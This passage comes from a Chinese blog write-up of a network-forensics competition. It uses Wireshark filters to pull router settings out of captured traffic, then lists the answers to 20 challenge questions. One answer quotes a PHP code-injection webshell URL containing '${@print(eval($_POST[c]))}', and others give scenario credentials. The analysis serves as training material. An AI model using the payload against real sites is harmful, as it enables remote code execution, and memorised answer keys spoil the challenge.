</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>此时可以发现一共有5个接口，其中WAN1、WAN2、LAN1、LAN2均被打开<br>并且ip为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">202.1.1.1</span><br><span class="line">192.168.12.173</span><br><span class="line">192.168.0.1</span><br></pre></td></tr></table></figure></p>
+<p>故此16,18题均被解答<br>然后是子网掩码的问题，这里我选择搜索网关相关内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 192.168.0.1 &amp;&amp; http contains &quot;gateway&quot;</span><br></pre></td></tr></table></figure></p>
+<p>然后可以发现如下数据<br><img src="/images/5.18wireshark (22).jpg"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;id&quot;:1,</span><br><span class="line">&quot;result&quot;:[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;metric&quot;:&quot;0&quot;,</span><br><span class="line">        &quot;gateway&quot;:&quot;192.168.12.254&quot;,</span><br><span class="line">        &quot;mask&quot;:&quot;0.0.0.0&quot;,</span><br><span class="line">        &quot;dest&quot;:&quot;0.0.0.0&quot;,</span><br><span class="line">        &quot;interface&quot;:&quot;WAN2&quot; </span><br><span class="line">&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;metric&quot;:&quot;0&quot;,</span><br><span class="line">        &quot;gateway&quot;:&quot;0.0.0.0&quot;,</span><br><span class="line">        &quot;mask&quot;:&quot;255.0.0.0&quot;,</span><br><span class="line">        &quot;dest&quot;:&quot;127.0.0.0&quot;,</span><br><span class="line">        &quot;interface&quot;:&quot;lo&quot; </span><br><span class="line">&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;metric&quot;:&quot;0&quot;,</span><br><span class="line">        &quot;gateway&quot;:&quot;0.0.0.0&quot;,</span><br><span class="line">        &quot;mask&quot;:&quot;255.255.252.0&quot;,</span><br><span class="line">        &quot;dest&quot;:&quot;192.168.0.0&quot;,</span><br><span class="line">        &quot;interface&quot;:&quot;LAN&quot; </span><br><span class="line">&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;metric&quot;:&quot;0&quot;,</span><br><span class="line">        &quot;gateway&quot;:&quot;0.0.0.0&quot;,</span><br><span class="line">        &quot;mask&quot;:&quot;255.255.255.0&quot;,</span><br><span class="line">        &quot;dest&quot;:&quot;192.168.12.0&quot;,</span><br><span class="line">        &quot;interface&quot;:&quot;WAN2&quot; </span><br><span class="line">&#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;metric&quot;:&quot;0&quot;,</span><br><span class="line">        &quot;gateway&quot;:&quot;0.0.0.0&quot;,</span><br><span class="line">        &quot;mask&quot;:&quot;255.255.255.0&quot;,</span><br><span class="line">        &quot;dest&quot;:&quot;202.1.1.0&quot;,</span><br><span class="line">        &quot;interface&quot;:&quot;WAN1&quot; </span><br><span class="line">&#125; </span><br><span class="line">],</span><br><span class="line">&quot;error_code&quot;:&quot;0&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>所以一共有5条，第三条为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &quot;metric&quot;:&quot;0&quot;,</span><br><span class="line">    &quot;gateway&quot;:&quot;0.0.0.0&quot;,</span><br><span class="line">    &quot;mask&quot;:&quot;255.255.252.0&quot;,</span><br><span class="line">    &quot;dest&quot;:&quot;192.168.0.0&quot;,</span><br><span class="line">    &quot;interface&quot;:&quot;LAN&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>子网掩码为<code>255.255.252.0</code><br>至此19题完结<br>然后最后问到信道，于是我的过滤为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 192.168.0.1 &amp;&amp; http contains &quot;channel&quot;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/5.18wireshark (23).jpg"><br>得到数据<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     &quot;id&quot;:1,</span><br><span class="line">     &quot;result&quot;:&#123;</span><br><span class="line">         &quot;1&quot;:&#123;</span><br><span class="line">             &quot;mssid&quot;:[</span><br><span class="line">                 &quot;test-ge1&quot; </span><br><span class="line">            ],</span><br><span class="line">             &quot;wds&quot;:&quot;off&quot;,</span><br><span class="line">             &quot;channel&quot;:36,</span><br><span class="line">             &quot;mode&quot;:&quot;11anac mixed&quot;,</span><br><span class="line">             &quot;radio_enable&quot;:&quot;on&quot;,</span><br><span class="line">             &quot;amount&quot;:0,</span><br><span class="line">             &quot;frequency&quot;:&quot;5G&quot; </span><br><span class="line">        &#125;,</span><br><span class="line">         &quot;0&quot;:&#123;</span><br><span class="line">             &quot;mssid&quot;:[</span><br><span class="line">                 &quot;test-ge1&quot; </span><br><span class="line">            ],</span><br><span class="line">             &quot;wds&quot;:&quot;off&quot;,</span><br><span class="line">             &quot;channel&quot;:1,</span><br><span class="line">             &quot;mode&quot;:&quot;11bgn mixed&quot;,</span><br><span class="line">             &quot;radio_enable&quot;:&quot;on&quot;,</span><br><span class="line">             &quot;amount&quot;:1,</span><br><span class="line">             &quot;frequency&quot;:&quot;2.4G&quot; </span><br><span class="line">        &#125;,</span><br><span class="line">         &quot;2&quot;:&#123;</span><br><span class="line">             &quot;mssid&quot;:[</span><br><span class="line">                 &quot;TP-LINK_GUEST_6258&quot; </span><br><span class="line">            ],</span><br><span class="line">             &quot;amount&quot;:0,</span><br><span class="line">             &quot;mode&quot;:&quot;11bgn mixed&quot;,</span><br><span class="line">             &quot;radio_enable&quot;:&quot;off&quot;,</span><br><span class="line">             &quot;frequency&quot;:&quot;visitor&quot; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;,</span><br><span class="line">     &quot;error_code&quot;:&quot;0&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>重点为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&quot;1&quot;:&#123;</span><br><span class="line">    &quot;mssid&quot;:[</span><br><span class="line">        &quot;test-ge1&quot; </span><br><span class="line">],</span><br><span class="line">    &quot;wds&quot;:&quot;off&quot;,</span><br><span class="line">    &quot;channel&quot;:36,</span><br><span class="line">    &quot;mode&quot;:&quot;11anac mixed&quot;,</span><br><span class="line">    &quot;radio_enable&quot;:&quot;on&quot;,</span><br><span class="line">    &quot;amount&quot;:0,</span><br><span class="line">    &quot;frequency&quot;:&quot;5G&quot; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以清晰看到，名称为<code>test-ge1</code>，信道为36<br>然后是最最蛇皮的17问：在路由器的端口监控中，监控端口和被监控端口分别是多少，例，1号端口监控2/3/4号端口:1–&gt;2,3,4<br>这个我可以说相当薄弱了，并不是很懂，但是其中提及端口，于是我的关键词为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.addr == 192.168.0.1 &amp;&amp; http contains &quot;port&quot;</span><br></pre></td></tr></table></figure></p>
+<p>数据并不是很多，看到最后有<br><img src="/images/5.18wireshark (24).jpg"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;id&quot;:1, &quot;result&quot;:&#123; &quot;state&quot;:&quot;on&quot;, &quot;mode&quot;:&quot;both&quot;, &quot;mirroredports&quot;:[ &quot;1&quot;, &quot;2&quot; ], &quot;mirrorport&quot;:&quot;3&quot; &#125;, &quot;error_code&quot;:&quot;0&quot; &#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以断定答案为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3--&gt;1,2</span><br></pre></td></tr></table></figure></p>
+<p>最后阶段归纳一下答案<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">14.请列出黑客设置的genreal log的绝对路径(将路径复制出来，区分大小写)</span><br><span class="line">c:/phpStudy/WWW/config/config.php</span><br><span class="line">15.路由器的品牌、型号、版本(请直接复制粘贴)</span><br><span class="line">TL-WAR1300L v1.0</span><br><span class="line">16.列出路由器的所有IP地址(格式：从小到大，用英文逗号分隔)</span><br><span class="line">192.168.0.1,192.168.12.173,202.1.1.1</span><br><span class="line">17.在路由器的端口监控中，监控端口和被监控端口分别是多少，例，1号端口监控2/3/4号端口:1--&gt;2,3,4</span><br><span class="line">3--&gt;1,2</span><br><span class="line">18.路由器一共有几个接口?其中有几个WAN口启用?有几个LAN口启用(格式:用英文逗号分隔)</span><br><span class="line">5,2,2</span><br><span class="line">19.路由器的系统路由表中一共有几条?第三条的子网掩码是多少。例: 255 255.255.0则为24 (格式:用英文逗号分隔)</span><br><span class="line">5,255.255.252.0</span><br><span class="line">20.路由器的5Gwif名称是什么，信道是多少(格式:名称信道)</span><br><span class="line">test-ge136</span><br></pre></td></tr></table></figure></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>最后完整答案为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">1.黑客的IP是多少</span><br><span class="line">202.1.1.2</span><br><span class="line">2.服务器1.99的web服务器使用的CMS及其版本号(请直接复制)</span><br><span class="line">EasyTalk X2.0.1</span><br><span class="line">3.服务器拿到的webshell的网址(请输入url解码后的网址)</span><br><span class="line">http://202.1.1.1/index.php/module/action/param1/$&#123;@print(eval($_POST[c]))&#125;</span><br><span class="line">4.服务器1.99的主机名</span><br><span class="line">simplefight1</span><br><span class="line">5.网站根目录的绝对路径(注意最后加斜杠)</span><br><span class="line">/var/www/html/easytalk</span><br><span class="line">6.黑客上传的第一个文件名称是什么</span><br><span class="line">scan.php</span><br><span class="line">7.黑客进行内网扫描，扫描的端口都有哪些(端口从小到大，用英文逗号分隔)</span><br><span class="line">21,80,8080,1433,3306</span><br><span class="line">8.服务器2.88的ftp服务账号密码(格式：账号/密码)</span><br><span class="line">administrator:123456</span><br><span class="line">9.黑客成功登陆ftp的时间(格式：10:15:36)</span><br><span class="line">14:07:15</span><br><span class="line">10.黑客在ftp中下载的敏感文件名称是什么</span><br><span class="line">config_db.php</span><br><span class="line">11.服务器2.88中用户名为admin_zz的web后台管理员的密码</span><br><span class="line">1q2w3e4r</span><br><span class="line">12.服务器2.88的mysql账号密码(格式：账号/密码)</span><br><span class="line">localhost/S1mp13zz</span><br><span class="line">13.服务器2.88的mysql服务中有和admin有关的三个表，请按照黑客的查询顺序作答，使用空格分隔</span><br><span class="line">met_admin_array met_admin_column met_admin_table</span><br><span class="line">14.请列出黑客设置的genreal log的绝对路径(将路径复制出来，区分大小写)</span><br><span class="line">c:/phpStudy/WWW/config/config.php</span><br><span class="line">15.路由器的品牌、型号、版本(请直接复制粘贴)</span><br><span class="line">TL-WAR1300L v1.0</span><br><span class="line">16.列出路由器的所有IP地址(格式：从小到大，用英文逗号分隔)</span><br><span class="line">192.168.0.1,192.168.12.173,202.1.1.1</span><br><span class="line">17.在路由器的端口监控中，监控端口和被监控端口分别是多少，例，1号端口监控2/3/4号端口:1--&gt;2,3,4</span><br><span class="line">3--&gt;1,2</span><br><span class="line">18.路由器一共有几个接口?其中有几个WAN口启用?有几个LAN口启用(格式:用英文逗号分隔)</span><br><span class="line">5,2,2</span><br><span class="line">19.路由器的系统路由表中一共有几条?第三条的子网掩码是多少。例: 255 255.255.0则为24 (格式:用英文逗号分隔)</span><br><span class="line">5,255.255.252.0</span><br><span class="line">20.路由器的5Gwif名称是什么，信道是多少(格式:名称信道)</span><br><span class="line">test-ge136</span><br></pre></td></tr></table></figure></p>
+<p>没想到最后竟然突然来了个路由器hacking，完全摸不到边，纯靠题目转英文进行过滤……<br>最蛇皮的是最后2个包都没用到，希望可以加强自身各种类型的流量分析的能力吧= =</p>
+
+    </article>
+    <!-- 前后页  -->
+    <ul class="post-pager">
+        
+        
+            <li class="previous">
+                <a href= "/2018/05/30/2018.5.5信息安全铁人三项赛数据赛题解/" title= 2017-2018赛季信息安全铁人三项赛全国第三赛区数据赛题解 >
+                    <span>Previous Post</span>
+                    <span>2017-2018赛季信息安全铁人三项赛全国第三赛区数据赛题解</span>
+                </a>
+            </li>
+        
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:136244588@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/skyofkinglove" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title="rss"></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">Theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv" style="color:black;font-size:14px">VISITOR VOLUME: <span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#题目描述"><span class="toc-number">1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第一个数据包"><span class="toc-number">2.</span> <span class="toc-text">第一个数据包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第二个数据包"><span class="toc-number">3.</span> <span class="toc-text">第二个数据包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第三个数据包"><span class="toc-number">4.</span> <span class="toc-text">第三个数据包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#第四个数据包"><span class="toc-number">5.</span> <span class="toc-text">第四个数据包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#路由器hacking"><span class="toc-number">6.</span> <span class="toc-text">路由器hacking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后记"><span class="toc-number">7.</span> <span class="toc-text">后记</span></a></li></ol>
+    </div>
+    
+    <div class="back-top">&#xe639;</div>
+    <div class="sidebar">
+    <div class="sidebar-header sidebar-header-show-archive">
+        <div class="sidebar-category">
+            <span class="sidebar-archive-link"><span class="iconfont-archer">&#xe67d;</span>Archive</span>
+            <span class="sidebar-tags-link"><span class="iconfont-archer">&#xe610;</span>Tag</span>
+        </div>
+    </div>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-archive">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
